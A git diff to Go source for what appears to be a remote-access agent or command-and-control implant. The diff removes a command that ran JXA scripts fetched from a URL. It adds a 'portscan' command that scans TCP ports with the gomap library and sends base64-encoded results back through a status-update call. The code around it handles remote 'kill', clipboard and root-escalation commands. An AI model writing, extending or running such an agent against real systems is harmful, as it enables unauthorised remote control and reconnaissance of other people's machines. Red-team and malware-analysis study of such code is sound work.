@@ -20,6 +20,7 @@ import (
 	"strings"
 	"time"
 
+	"github.com/JustinTimperio/gomap"
 	"github.com/lithammer/shortuuid"
 )
 
@@ -208,14 +209,10 @@ func runCommand(commandStr string, cmdid string) error {
 		return nil
 	case "kill":
 		os.Exit(0)
-	case "osa":
-		if len(arrCommandStr) == 1 {
-			data := "Required 1 arguments"
-			sEnc := base64.StdEncoding.EncodeToString([]byte(data))
-			updateCmdStatus(cmdid, sEnc)
-			return errors.New("Requires url")
-		}
-		runJXA(arrCommandStr[1], cmdid)
+	case "portscan":
+		data := portscan()
+		sEnc := base64.StdEncoding.EncodeToString([]byte(data))
+		updateCmdStatus(cmdid, sEnc)
 		return nil
 	case "clipboard":
 		print("clipboard")
@@ -431,4 +428,19 @@ func asroot() {
 	cmd.Stdout = &out
 	cmd.Stderr = &stderr
 	cmd.Run()
+}
+
+func portscan() string {
+	print("Scanning")
+	var (
+		proto    = "tcp"
+		fastscan = true
+		syn      = false
+	)
+
+	scan, err := gomap.ScanRange(proto, fastscan, syn)
+	if err != nil {
+		// handle error
+	}
+	return scan.String()
 }
